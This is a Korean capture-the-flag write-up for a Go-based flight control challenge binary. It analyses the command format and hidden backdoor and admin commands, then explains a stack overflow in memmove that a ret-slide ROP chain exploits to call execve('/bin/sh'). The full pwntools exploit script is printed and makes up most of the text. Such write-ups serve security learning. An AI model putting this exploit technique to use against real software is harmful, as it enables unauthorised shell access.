# 👮 국방본부
> 국방본부의 비행 원격 조종 시스템을 만들어 놓은 문제이다.

## Analysis
커맨드 형식으로 명령을 내릴 수 있는 프로그램이라 먼저 커맨드 구조를 알아야 하는데 분석하면 다음과 같다.
```py
# 1byte(cmdIndex) + 1byte(numberOfCmd) + 4byte(cmdValueLength) + cmdValue

struct CmdStruct {
    unsigned char cmdIndex;
    unsigned char numberOfCmd;
    unsigned int cmdValueLength;
    unsigned char* cmdValue
}
```

위 구조를 토대로 파이썬 함수를 작성해보면 다음과 같다.
```py
def cP(_cmd, _cmdNum, _val, ex=False): # cmdProcessing
    cmdIndex = _cmd
    numberOfCmd = noc(_cmdNum)
    cmd = ''

    s.send(cmdIndex + numberOfCmd)

    val = str(_val)
    s.send(p32(len(val))) # value_len
    s.send(val.ljust(len(val), '\x00')) # value
```

메뉴에서 설명하는 커맨드 번호와 실행을 위한 커맨드 번호가 달라서 일일히 분석해야 하는데, 이는 다음과 같다.
```py
V - Inc Alti
W - Dec Alti
R - Set Alti
T - Get Alti
X - Inc Speed
Y - Dec Speed
U - Get Speed
S - Set Speed
Z - GetFlightStatus
M - ADDQ
N - SUBQ
Q - PRINTQ
\x03 - ReplayLog
\x02 - LogFlight
\x01 - GetInfo
d - DEBUG
\\ - Admin Command
[ - Backdoor
```

분석해보면 메뉴에서 설명되어 있지 않는 `\\\\, [` 커맨드가 존재하기 때문에, 여기서부터 분석을 진행하였다.

`\\\\` 커맨드를 실행하려면 `StatusDebugMode`가 활성화 되어야 하는데, 이는 `[` 커맨드를 이용하면 활성화시킬 수 있다.

이렇게 활성화시키면 `\\\\` 커맨드에서 `runtime_memmove` 함수를 실행시키는데, 길이 인자를 `StatusFlightNameLength`에서 가져오기 때문에 이를 `[` 커맨드를 이용하여 수정하면 런타임 스택 오버플로우를 일으킬 수 있다.

런타임 스택에서 오버플로우가 나고, 이를 쓰레드로 돌고 있는 `goroutine`들이 fs 레지스터로부터 참조하면서 ROP가 가능한데, 특정 쓰레드가 고장나면 메인 쓰레드에서 트레이스를 내고 종료되기 때문에 모든 쓰레드에서 ROP를 진행해야 한다. 

`ret slide`를 통해 모든 쓰레드에서 ROP가 가능하다.

특히, golang elf에는 `libc`가 존재하지 않기 때문에 `syscall`을 이용하여 `execve("/bin/sh", 0, 0)`을 부르면 된다.
## Entire Exploit Code
```py
from pwn import *

# context.log_level = 'debug'

e = ELF('./System')
l = e.libc

'''
  1. ADDQ <data>: Add data to the arrival queue
  2. SUBQ <key>: Retrieve data from the arrival queue and store it with the specified key
  3. PRINTQ <key>: Print the stored data associated with the specified key
  4. DEBUG: Display debug information
  5. GETINFO: Get flight information
  6. LOGFLIGHT <log>: Add a log entry to the flight log
  7. REPLAYLOGS: Replay the flight logs
  8. SETALTITUDE <altitude>: Set the altitude of the flight
  9. SETSPEED <speed>: Set the speed of the flight
 10. GETALTITUDE: Get the current altitude of the flight
 11. GETSPEED: Get the current speed of the flight
 12. INCREASEALTITUDE <amount>: Increase the altitude of the flight by the specified amount
 13. DECREASEALTITUDE <amount>: Decrease the altitude of the flight by the specified amount
 14. INCREASESPEED <amount>: Increase the speed of the flight by the specified amount
 15. DECREASESPEED <amount>: Decrease the speed of the flight by the specified amount
 16. GETFLIGHTSTATUS: Get the current flight status
 17. FoldFlap <flapnumber> <swtich>: Activate the plane's flap function.
'''

def _sleep(_t):
    # sleep(_t)
    pass

def menu(sel):
    # s.sendlineafter(b">\n", sel)
    s.sendline(sel)
    _sleep(0.1)

def noc(numberOfCmd):
    numberOfCmd = bytes([numberOfCmd])
    return numberOfCmd.decode('latin1')

gs = '''
b* 0x4a9b70
'''
# gs = ''

def db(s):
    gdb.attach(s, gdbscript=gs)
    pause()

s = process(e.path)

def cP(_cmd, _cmdNum, _val, ex=False):
    cmdIndex = _cmd
    numberOfCmd = noc(_cmdNum)
    cmd = ''

    s.send(cmdIndex + numberOfCmd)
    _sleep(0.1)

    if not ex:
        val = str(_val)
        s.send(p32(len(val))) # value_len
        _sleep(0.1)
        s.send(val.ljust(len(val), '\x00')) # value
        _sleep(0.1)

def cD(_val):
    val = str(_val)
    s.send(p32(len(val))) # value_len
    _sleep(0.1)
    s.send(str(val).ljust(len(val), '\x00')) # value
    _sleep(0.1)

'''
V - Inc Alti
W - Dec Alti
R - Set Alti
T - Get Alti
X - Inc Speed
Y - Dec Speed
U - Get Speed
S - Set Speed
Z - GetFlightStatus
M - ADDQ
N - SUBQ
Q - PRINTQ
\x03 - ReplayLog
\x02 - LogFlight
\x01 - GetInfo
d - DEBUG
'''

'''
main_Flight.Storage['StatusDebugMode'] = 'T'/'t'/'1'/1
main_Flight.Storage['StatusFlightNameLength'] = 'True'
main_Flight.Storage['Q_new_flight_name'] = 'A'*0x100
'''
# main_Flight.Storage['StatusDebugMode'] = 'T'/'t'/'1'/1
cP('[', 2, 'DebugMode')
cD('True')
# main_Flight.Storage['StatusFlightNameLength'] = 'True'
cP('[', 2, 'FlightNameLength')
cD('False')

# pay = cyclic(cyclic_find(b'usqeusreusseu')) # runtime.futex
# pay = cyclic(cyclic_find(b'qmqeqmreqmseqmt')) # runtime.usleep
# print(hex(cyclic_find(b'qmqeqmreqmseqmt')))
# pay = b"A"*0x20000
pay = bytes.fromhex('''
4343453939383939
5b02000009000000
44656275674d6f64
6500000004000000
44656275674d6f64
6500000000000000
5472756554727565
5472756500000000
5374617475734465
6275674d6f646500
5b02000010000000
0500000000000000
466c696768744e61
6d654c656e677468
466c696768744e61
6d654c656e677468
46616c736546616c
7365000000000000
46616c7365000000
4d01000000bf0300
4e0100000f000000
5c01000002000000
6e65775f666c6967
68745f6e616d6500
6e65775f666c6967
68745f6e616d6500
3635363554727565
''')

dummy = 0x558570

pay = p64(0x401046) * (0x20000)
# pay = cyclic(cyclic_find(b'gehghehgiehgje')) # runtime.futex
# pay = cyclic(cyclic_find(b'yxjnyyjnyzjnz')) # runtime.memmove

ret = 0x401046
prax = 0x00406401
prdi = 0x00000000004100dd # rax is valid
prsi = 0x00417a2f # adc rax
prdx = 0x0041e26e # add al; xchg esp, eax
syscall = 0x004663c9

context.arch = 'amd64'

pay = p64(ret) * 0x20000

# execve('/bin/sh', 0, 0)
pay += flat(
    prax,
    dummy,
    prdi,
    0,
    prsi,
    0x559000,
    prdx,
    0x10,
    prax,
    0,
    syscall,
)
pay += flat(
    prax,
    0x558570,
    prdi,
    0x559000,
    prsi,
    0,
    prdx,
    0,
    prax,
    0x3b,
    syscall
)
# main_Flight.Storage['Q_new_flight_name'] = 'A'*0x100
cP('M', 1, '', True) # target is rbp-0x1b0
s.send(p32(len(pay)))
s.send(pay)
cP('N', 1, 'new_flight_name')

# cP('d', 1, 0x41)
# db(s)

# boom
cP('\\', 1, 0x41)

# pause()
s.send(b"/bin/sh\x00")
s.send(b'id')
s.interactive()
```